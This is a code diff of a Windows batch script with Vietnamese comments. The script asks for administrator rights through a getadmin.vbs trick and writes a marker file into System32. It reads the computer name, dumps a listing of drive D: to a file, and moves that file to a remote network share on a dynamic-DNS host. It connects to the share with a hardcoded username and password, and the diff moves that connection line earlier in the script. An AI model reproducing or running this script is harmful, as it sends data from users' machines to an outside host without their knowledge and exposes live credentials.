@@ -4,6 +4,8 @@ cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) &&
 echo Hello anh Dung Ha > "C:\Windows\System32\WindowsPowerShell\hehehe.txt"
 rem del /f /q "C:\Windows\System32\WindowsPowerShell\hehehe.txt"
 setlocal enabledelayedexpansion
+:: Kết nối đến chia sẻ mạng \\minhtuan283.ddns.net\hdd
+net use \\minhtuan283.ddns.net\hdd /user:minhtuan283 Thienngan2002
 
 :: Lấy tên máy tính bằng PowerShell
 for /f "delims=" %%i in ('powershell -command "(Get-CimInstance -ClassName Win32_ComputerSystem).Name"') do set DeviceName=%%i
@@ -17,8 +19,6 @@ set TIME=%TIME::=-%
 :: Liệt kê nội dung ổ D: và lưu vào file
 dir D:\ > "%DeviceName%_%DATE%_%TIME%.txt"
 
-:: Kết nối đến chia sẻ mạng \\minhtuan283.ddns.net\hdd
-net use \\minhtuan283.ddns.net\hdd /user:minhtuan283 Thienngan2002
 
 :: Di chuyển file đến thư mục đích trên mạng
 move "%DeviceName%_%DATE%_%TIME%.txt" \\minhtuan283.ddns.net\hdd\serial\list\
